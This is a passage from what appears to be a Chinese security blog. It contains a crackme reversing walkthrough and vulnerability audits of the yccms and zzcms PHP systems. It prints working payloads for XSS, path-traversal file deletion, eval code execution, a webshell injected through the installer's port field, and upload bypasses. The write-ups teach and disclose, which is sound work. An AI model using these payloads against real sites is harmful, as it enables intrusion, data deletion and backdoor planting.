src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/7.png" alt="7"></p><blockquote><p>然后继续F8运行  但运行到call  走不动了   然后程序提示输入   那这个函数应该就是获取输入的值</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/8.png" alt="8"></p><blockquote><p>但是通过这里可以发现  是将第一个局部变量的地址传了进去    但前面又是赋值的0 是int型   输入的又是字符串型 对不上啊  前面的5个局部变量又是地址挨着的   那可以猜测 不是5个局部int变量    而是一个char类型的数组   然后将首地址传了进去  这样就对得上了</p></blockquote><blockquote><p>然后在程序框输入123456  然后执行</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/9.png" alt="9"></p><blockquote><p>可以发现 函数执行后  又将数组的第一个地址给了edx   然后push到了 下一个call   因为在call后面是add esp，0x4   那应该就只传了一个参数  就是push的edx</p></blockquote><blockquote><p>后面的这一个函数我们先不跟进  就先直接执行  然后看看寄存器值的变化</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/10.png" alt="10"></p><blockquote><p>发现eax变成了0  因为一般eax是函数的返回值 但也不一定    然后看后面  又用到了eax   那大概率就是返回值了 </p></blockquote><blockquote><p>然后看后面cmp 又和0比较  然后je跳转   直接跳到了error  那如果要返回正确 就要eax返回的值不是0 是其他的或者1</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/11.png" alt="11"></p><blockquote><p>je 主要是根据ZF标志寄存器来判断的只要ZF不为1就行  或者直接将je 用 nop填充 也直接执行right</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/12.png" alt="12"></p><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/13.png" alt="13"></p><blockquote><p>但是这样没有拿到 正确的key  为了拿到正确的key  我们跟进那个判断的函数</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/14.png" alt="14"></p><blockquote><p>发现这个函数push了两个值  一个hello51hook 还有一个从地址取出存到eax里面</p></blockquote><blockquote><p>ebp+8  就是我们输入的值   也就是函数传参的第一个参数</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/15.png" alt="15"></p><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/16.png" alt="16"></p><blockquote><p>通过add esp 0x8  也可以判断出 这个call  接收了2个参数</p></blockquote><blockquote><p>然后执行完call 发现eax变成的FFFFFFFF  也就是-1</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/17.png" alt="17"></p><blockquote><p>然后看后边 test eax eax 与运算  除了0与0 为0  其他的与本身肯定是不为0的  然后jnz跳转   FFFFFF  肯定运算出来不为0  所以是要跳转的</p></blockquote><blockquote><p>看下面  直接跳转到xor  清空eax  然后就返回0出去了</p></blockquote><blockquote><p>所以这个函数就相当于判断传入的字符串与hello51hook是否相等  相等肯定返回出去的就是1了</p></blockquote><blockquote><p>如果相等的话 ZF就会是1    会给eax  1 然后直接执行jmp跳转到下面就返回出去了</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/18.png" alt="18"></p><blockquote><p>然后现在正确的key也拿到了 就不用分析了后面   </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccms审计</title>
    <link href="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>##Yccms审计</p><p>下载源码<a href="http://ahdx.down.chinaz.com/202003/yccms_v3.4.rar">http://ahdx.down.chinaz.com/202003/yccms_v3.4.rar</a></p><blockquote><p>目录整体结构</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/1.png" alt="1"></p><blockquote><p>先打开首页</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/2.png" alt="2"></p><blockquote><p>很显然 首页没有什么内容</p></blockquote><blockquote><p>然后打开审计工具</p></blockquote><h3 id="第一处xss"><a href="#第一处xss" class="headerlink" title="第一处xss"></a>第一处xss</h3><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/3.png" alt="3"></p><blockquote><p>在第一行发现了一个xss漏洞 跟进看看</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/4.png" alt="4"></p><blockquote><p>直接echo  也没有什么过滤 通过$GET请求 获取$art参数的值 直接用echo输出</p></blockquote><blockquote><p>直接构造payload：?art=<script>alert(1)</script></p></blockquote><blockquote><p>xss测试</p></blockquote><blockquote><p>访问这个页面并添加payload</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/5.png" alt="5"></p><blockquote><p>Xss成功</p></blockquote><h3 id="第二处任意文件删除"><a href="#第二处任意文件删除" class="headerlink" title="第二处任意文件删除"></a>第二处任意文件删除</h3><blockquote><p>通过自动审计工具 发现了一个任意文件读取或删除</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/6.png" alt="6"></p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/7.png" alt="7"></p><blockquote><p>关键函数在delall函数中 我们往下分析</p></blockquote><blockquote><p>先是判断post请求中是否有send参数 然后才进入if里面</p></blockquote><blockquote><p>为好了跟进函数 换到phpstorm</p></blockquote><blockquote><p>If是通过validate类的<strong>isNullString<strong><strong>函数来判断</strong></strong>post<strong><strong>请求中的</strong></strong>pic****参数的值</strong></p></blockquote><blockquote><p><strong>我们跟进这个<strong><strong>isNullString</strong></strong>函数</strong></p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/8.png" alt="8"></p><blockquote><p>在验证类里面  <strong>isNullString<strong><strong>是为了判断</strong></strong>pic****的值是否为空</strong> <strong>空的话就返回<strong><strong>true</strong></strong>否则****false</strong></p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/9.png" alt="9"></p><blockquote><p>在根据if的逻辑来看 就是 如果pic的值是空的话 就进入if 然后执行tool类的函数 这个应该就是提示的</p></blockquote><blockquote><p>然后将路径和uploads拼接 ROOT_PATH是定义的根目录</p></blockquote><blockquote><p>打印看看</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/10.png" alt="10"></p><blockquote><p>相当于拼接后 是uploads目录下</p></blockquote><blockquote><p>继续往下看</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/11.png" alt="11"></p><p>然后通过foreach循环 将pic的值赋给 $_value 然后拼接到路径上</p><p>然后将路径放到unlink（）函数中进行删除，返回值为ture或者false然后再执行if-else语句</p><p>unlink() 函数删除文件。</p><p>但是这里没有对路径进行任何的过滤和防护 就可以构造../来跨目录删除其他文件</p><p>构造payload：pid[0]=../2.txt</p><p>文件删除测试</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/12.png" alt="12"></p><blockquote><p>来到后台 其他功能的地方</p></blockquote><blockquote><p>然后点击删除选择的图片进行抓包</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/13.png" alt="13"></p><blockquote><p>将payload加上  提前在文件夹创建好测试文件</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/14.png" alt="14"></p><blockquote><p>这是在根目录下创建好的 然后点击go</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/15.png" alt="15"></p><blockquote><p>然后查看根目录</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/16.png" alt="16"></p><blockquote><p>发现2.txt已经不见了 成功删除</p></blockquote><h3 id="第三处代码执行"><a href="#第三处代码执行" class="headerlink" title="第三处代码执行"></a>第三处代码执行</h3><blockquote><p>通过审计工具 发现一个可能代码执行的漏洞 </p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/17.png" alt="17"></p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/18.png" alt="18"></p><blockquote><p>为了方便操作 还是习惯用phpstorm 切换回来</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/19.png" alt="19"></p><blockquote><p>漏洞存在的点在这个eval函数 </p></blockquote><blockquote><p>先看看整段的逻辑</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/20.png" alt="20"></p><p>在factory类中 的setAction函数里  这个函数先通过getA 获取get请求a的值  </p><p>然后通过if判断a的值 是否为数组里面的 然后判断session是否是admin权限 进行是否跳转到登录 </p><p>但这一步 直接不进入if判断 不久跳过这个session判断了嘛</p><p>往后看</p><p>然后通过file_exits 函数判断文件是否存在  不存在则给$_a赋值login</p><p>file_exists() 函数检查文件或目录是否存在。</p><p>然后进入到eval函数执行self::$_obj = new ‘.ucfirst($_a).’Action();</p><p>ucfirst() 函数把字符串中的首字符转换为大写。</p><p>进入eval函数的内容没有经过任何过滤 又因为$_a 是通过get请求获取的 可控 就导致了 eval函数里面的内容可控 至此 导致代码执行</p><p>先找找那个文件调用了这个类</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/21.png" alt="21"></p><p>Run.inc.php这个文件实例了这个类并且调用了setAction函数</p><p>然后寻找哪个文件引用了Run.inc.php文件</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/22.png" alt="22"></p><p>Admin/index.php 和 count.php 都引用了</p><p>构造payload：?a=Factory();phpinfo();//../</p><p>先测试 后面在说说为什么这样构造</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/23.png" alt="23"></p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/24.png" alt="24"></p><p>两个文件都可以直接命令执行</p><p>说说这样构造我自己的理解 file_exits 函数在判断文件的时候</p><p>他判断的内容是：</p><p>D:/phpstudy_pro/WWW/yccms_v3.4/controller/Factory();phpinfo();//../Action.class.php</p><p>这是controller目录</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/25.png" alt="25"></p><p>判断的时候 函数将/Factory();phpinfo();/  //里面的内容当成了目录 虽然不存在 但是还是继续往后进行的判断 然后遇到../ 就回到了上一级目录controller目录 目录下又有Action.class.php这个文件 所以file_exits 能返回true 所以没有进入if</p><p>我在cmd测试也能成功切换</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/26.png" alt="26"></p><p>然后来到eval函数里面 里面相当于执行的内容是self::$_obj = new Factory();phpinfo();//../Action();</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/27.png" alt="27"></p><p>Factory() 是为了闭合前面的new  后面的// 则相当于把后面的action() 注释掉了 </p><p>所以最后phpinfo() 直接执行了</p><p>把phpinfo() 换成一句话就直接用蚁剑菜刀进行链接就行了 这里我就不做演示了</p><p>这就是我对这个洞的理解  有什么理解不对的地方望师傅们指出</p><h3 id="第四处-任意文件上传"><a href="#第四处-任意文件上传" class="headerlink" title="第四处 任意文件上传"></a>第四处 任意文件上传</h3><p>逛后台的时候发现一个logo上传</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/28.png" alt="28"></p><p>点击上传 发现打开了另一个窗口</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/29.png" alt="29"></p><p>复制url到另一个浏览器打开</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/30.png" alt="30"></p><p>不需要任何权限验证就直接打开了 只要有这个url 就可以上传文件了</p><p>尝试上传</p><p>直接尝试图片马 抓包修改后缀php</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/31.png" alt="31"></p><p>可以看到 d盘下有个logo.php</p><p>虽然报错了 打开文件夹看看</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/32.png" alt="32"></p><p>Php成功上传了 尝试打开  这里是可以不需要登录就可以上传的 只需要这个数据包或者上传文件的url</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/33.png" alt="33"></p><blockquote><p>上传成功</p></blockquote><blockquote><p>通过报错我们找到文件进行代码分析</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/34.png" alt="34"></p><blockquote><p>在public/class/LogoUpload.class.php文件下 我们跟进logoupload类</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/35.png" alt="35"></p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/36.png" alt="36"></p><blockquote><p>可以看出只检验了Content-Type 没有检测后缀什么的  所以 图片马抓包改后缀可以直接绕过</p></blockquote><h3 id="第五处任意文件上传"><a href="#第五处任意文件上传" class="headerlink" title="第五处任意文件上传"></a>第五处任意文件上传</h3><blockquote><p>在后台的添加文章的地方 有个编辑器</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/37.png" alt="37"></p><blockquote><p>测试方法和上面一下 先上传图片马抓包</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/38.png" alt="38"></p><blockquote><p>同样直接上传成功了</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/39.png" alt="39"></p><blockquote><p>分析代码</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/40.png" alt="40"></p><blockquote><p>还是定位到这个文件public/class/LogoUpload.class.php  继续跟进fileupload</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/41.png" alt="41"></p><blockquote><p>也只进行了 type验证</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/42.png" alt="42"></p><blockquote><p>绕过方法和上面的任意上传一样 就不多赘述了</p></blockquote><blockquote><p>删掉cookie等 也是可以上传的</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/43.png" alt="43"></p><h3 id="第六处未授权修改管理员密码"><a href="#第六处未授权修改管理员密码" class="headerlink" title="第六处未授权修改管理员密码"></a>第六处未授权修改管理员密码</h3><blockquote><p>来到后台的修改密码的地方</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/44.png" alt="44"></p><blockquote><p>修改密码进行抓包</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/45.png" alt="45"></p><blockquote><p>然后分析源码</p></blockquote><blockquote><p>在adminaction.class.php中</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/46.png" alt="46"></p><blockquote><p>先判断post请求中的send</p></blockquote><blockquote><p>然后判断用户名和密码是否是空等操作 然后来到editadmin() 进行跟进</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/47.png" alt="47"></p><blockquote><p>直接执行</p></blockquote><blockquote><p>通过代码分析 都没有对是否登录 等权限进行判断 所以删除cookie还是可以直接添加</p></blockquote><blockquote><p>但是当我把cookie删完的时候包用户名为空的错误 我就不理解了</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/48.png" alt="48"></p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/49.png" alt="48"></p><blockquote><p>为什么爆这个错啊 这里就很懵</p></blockquote><blockquote><p>望师傅们指点</p></blockquote><h3 id="第七处-验证码重放"><a href="#第七处-验证码重放" class="headerlink" title="第七处 验证码重放"></a>第七处 验证码重放</h3><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/50.png" alt="50"></p><p>后台登录错误验证码不刷新 可导致爆破 这个就不做演示了 师傅们都会</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zzcms的再一次审计</title>
    <link href="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>首发 奇安信攻防社区<a href="https://forum.butian.net/share/640">https://forum.butian.net/share/640</a></p><p>在看了社区<a href="https://forum.butian.net/share/460%E5%B8%88%E5%82%85%E7%9A%84%E6%96%87%E7%AB%A0%E5%90%8E">https://forum.butian.net/share/460师傅的文章后</a> 找师傅要到源码 然后在次对zzcms发起了审计</p></blockquote><h3 id="审计开始"><a href="#审计开始" class="headerlink" title="审计开始"></a>审计开始</h3><blockquote><p>首先打开页面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/1.png" alt="1"></p><h3 id="第一处sql"><a href="#第一处sql" class="headerlink" title="第一处sql"></a>第一处sql</h3><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/2.png" alt="2"></p><blockquote><p>来到ask/search.php 页面 这里定义了一个$fp 引入了一个模板 然后通过$f用fopen函数用只读的方式打开ask_search.htm</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/3.png" alt="3"></p><blockquote><p>然后通过fread函数来读取<br>fread() 函数读取文件（可安全用于二进制文件）。</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/4.png" alt="4"></p><blockquote><p>然后期间经过了一些str_replace函数的过滤 在232行 调用的showlabel函数<br>我们跟进这个函数</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/5.png" alt="5"></p><blockquote><p>通过foreach函数遍历channels数组 经过测试 最后都会进入到if里面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/6.png" alt="6"></p><blockquote><p>在if函数中又调用了fixed函数 我们继续跟进</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/7.png" alt="7"></p><blockquote><p>Fixed函数通过switch 根据传进来的channels值 分别调用函数 通过前面知道channels数组的第一个的ad 所以会进入ad 调用 showed函数 继续跟进showad</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/8.png" alt="8"></p><blockquote><p>Showad函数 会将传进去的内容先用explode函数进行分割 如果匹配不到分割的参数 则会返回整个$cs 是一个数组<br>所以后面$b就有值了 $s就为空<br>继续看后面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/9.png" alt="9"></p><blockquote><p>这里发现sql语句 肯定想到的是sql注入 所以我们要想办法让代码进入这里面执行 sql语句在else里面 我们看看if</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/10.png" alt="10"></p><blockquote><p>If里面的条件都是通过&amp;&amp; 拼接 所以我们只需要让一个不为true 就进入else<br>继续看 发现里面有一个filesize($fp)&gt;10的判断 然后我们往上看$fp<br>$Fp是通过一系列的拼接 其中就有$b 最后拼接成htm<br>这个$b从前面可知是我们可以控制的 所以最后拼接出来的htm只要不存在 if的条件就不成立 就进入了else 执行sql</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/11.png" alt="11"></p><blockquote><p>后面调用了query函数 我们跟进query函数</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/12.png" alt="12"></p><blockquote><p>是没有任何防护的（这里说错了 其实是有sql注入防护的  因为这里的数据是通过文件读取的 所以过滤函数没有起作用   后面会有介绍）<br>Sql测试</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/13.png" alt="13"></p><blockquote><p>来到后台 添加一个模板ask_search.htm<br>内容 <br>然后保存 然后访问 ask/search.php</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/14.png" alt="14"></p><blockquote><p>延时成功<br>我在测试这里的时候当时遇到了一个小问题 开始一直不能延时 后来才发现是zzcms_ad<br>这个表的原因</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/15.png" alt="15"></p><blockquote><p>Zzcms_ad 这个表不能为空 空的话 就无法延时</p></blockquote><h3 id="第二处代码执行："><a href="#第二处代码执行：" class="headerlink" title="第二处代码执行："></a>第二处代码执行：</h3><blockquote><p>在install/index.php的114行</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/16.png" alt="16"></p><blockquote><p>用fopen函数 写入的方式打开了文件<br>用fputs函数写入文件<br>fputs() 函数写入文件（可安全用于二进制文件）</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/17.png" alt="17"></p><blockquote><p>然后在step_2.php 以及 345文件中都没有发现判断是否又install.lock这个文件</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/18.png" alt="18"></p><blockquote><p>在install/index.php页面又是通过$step来包含这些页面的 然后我们看看这个$step是怎么传入的</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/19.png" alt="19"></p><blockquote><p>自己通过post的方式传入 也没有任何防护 所以我们可以直接通过post的方式构造step=2 直接来到安装步骤的第二步<br>测试<br>现进入install/index.php页面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/20.png" alt="20"></p><blockquote><p>然后打开hackbar</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/21.png" alt="21"></p><blockquote><p>这里有个疑惑 不知道为什么抓包改请求方式的办法 一直用不起 页面一直显示空白</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/22.png" alt="22"></p><blockquote><p>一直下一步 来到这里</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/23.png" alt="23"></p><blockquote><p>通过这里可以知道 创建数据库这一步的这些数据 会写入到另一个文件config.php</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/24.png" alt="24"></p><blockquote><p>并且写入的时候 没有什么过滤 说明 写入的参数是可控的 在这里可以直接尝试写入一句话<br>在端口的位置输入3306’);eval($_POST[‘a’]);(‘</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/25.png" alt="25"></p><blockquote><p>然后下一步</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/26.png" alt="26"></p><blockquote><p>然后查看config.php</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/27.png" alt="27"></p><blockquote><p>成功写入</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/28.png" alt="28"></p><blockquote><p>可getshell</p></blockquote><h3 id="第三处越权"><a href="#第三处越权" class="headerlink" title="第三处越权"></a>第三处越权</h3><blockquote><p>来到tag.php页面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/29.png" alt="29"></p><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/30.png" alt="30"></p><blockquote><p>现查出所有的表 然后和 cookie中的tablename的值进行比对<br>str_is_inarr跟进这个函数</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/31.png" alt="31"></p><blockquote><p>然后通过in_arr函数进行比对<br>in_array() 函数搜索数组中是否存在指定的值。<br>通过前面可知$tablenames 后面拼接了# 所以能够进入到if被然后被explode函数拆分 然后进入if 返回yes</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/32.png" alt="32"></p><blockquote><p>返回yes之后 就会执行下面的代码 然后根据dowhat 的值执行switch<br>前面两个看参数就知道 一个是增加 一个是修改 我们看第三个函数showtag()<br>跟进函数</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/33.png" alt="33"></p><blockquote><p>上面根据action参数 获取判断是px 或者是del<br>通过代码分析px 没有没什么可利用的 下面的del 有可控制的点</p></blockquote><blockquote><p>我们可以控制tablename和id 来控制删除数据<br>相当于这里就是通过cookie里面传的表 以及post传的id值 进行查询表的数据和id进行匹配 匹配到了 就直接删除 没有其他的限制<br>测试</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/34.png" alt="34"></p><blockquote><p>现在后台添加一个普通管理员ttt和一个超级管理员asd</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/35.png" alt="35"></p><blockquote><p>然后登录普通管理员</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/36.png" alt="36"></p><blockquote><p>然后访问tag.php  进行抓包</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/37.png" alt="37"></p><blockquote><p>改包之后进行放包</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/38.png" alt="38"></p><blockquote><p>asd超级管理员成功被ttt普通管理员删除</p></blockquote><blockquote><p>同理 也可以删除其他表的数据 只要表明 和id能匹配上</p></blockquote><h3 id="第四处sql"><a href="#第四处sql" class="headerlink" title="第四处sql"></a>第四处sql</h3><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/39.png" alt="39"></p><blockquote><p>来到bad.php页面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/40.png" alt="40"></p><blockquote><p>下面有sql语句<br>在in 后面的 $id 没有引号保护 可能被利用</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/41.png" alt="41"></p><blockquote><p>先来到bad.php页面 在数据库随便添加的数据<br>然后分析代码</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/42.png" alt="42"></p><blockquote><p>通过post传入id 然后action=del 进入到sql执行里面 如果id后面有逗号 则执行if<br>有则else 看看下面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/43.png" alt="43"></p><blockquote><p>执行sql的函数 我们跟进这个函数</p></blockquote><p><img 